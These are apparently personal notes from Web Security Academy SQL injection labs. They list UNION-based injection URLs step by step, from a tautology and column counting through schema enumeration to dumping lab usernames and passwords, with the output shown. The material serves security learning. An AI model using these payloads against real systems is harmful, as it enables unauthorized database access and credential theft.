
`webpage.com/filter?category=Lifestyle' or 1=1 --` Get's all categories

`/filter?category=Pets' union select null, null --` Find number of cols

`/filter?category=Pets' union select 'a', 'b' --` Make sure columns are text

`/filter?category=Pets' union select username, password from users --` Adds lines with username and password to the table
`/filter?category=qwe' union select username, password from users --` Shows only our data as the first value is bad and has no return values


---

https://0ad100d9049547f383e25aac00ec002f.web-security-academy.net/filter?category=qwe' union select null, version() -- -
PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

https://0abc00700372f26582d7428800aa008c.web-security-academy.net/filter?category=qwe' union select null, current_database() -- -
academy_labs

https://0abc00700372f26582d7428800aa008c.web-security-academy.net/filter?category=qwe' union select null, table_name from information_schema.tables -- -
lists all tables in all databases?

https://0abc00700372f26582d7428800aa008c.web-security-academy.net/filter?category=qwe' union select null, table_name from information_schema.tables where table_schema='public' -- -

users_pimwtb
products

should also try
```sql
select * from information_schema.tables
    where table_schema not in ('information_schema', 'pg_catalog') and
    table_type = 'BASE TABLE'
```

https://0abc00700372f26582d7428800aa008c.web-security-academy.net/filter?category=qwe' union select null, table_name from information_schema.tables where table_schema='information_schema' -- -

https://0abc00700372f26582d7428800aa008c.web-security-academy.net/filter?category=qwe' union select null, column_name from information_schema.columns where table_name='users_pimwtb' -- -
email
password_ilmwwh
username_plipxs

https://0abc00700372f26582d7428800aa008c.web-security-academy.net/filter?category=qwe' union select username_plipxs, password_ilmwwh from users_pimwtb -- -
administrator
	f12qv7wjp08hk8bps8f5
carlos
	iyz4jd9evzxwck8vodi0
wiener
	3a3nb5k4fnudlzfb0jqk

---

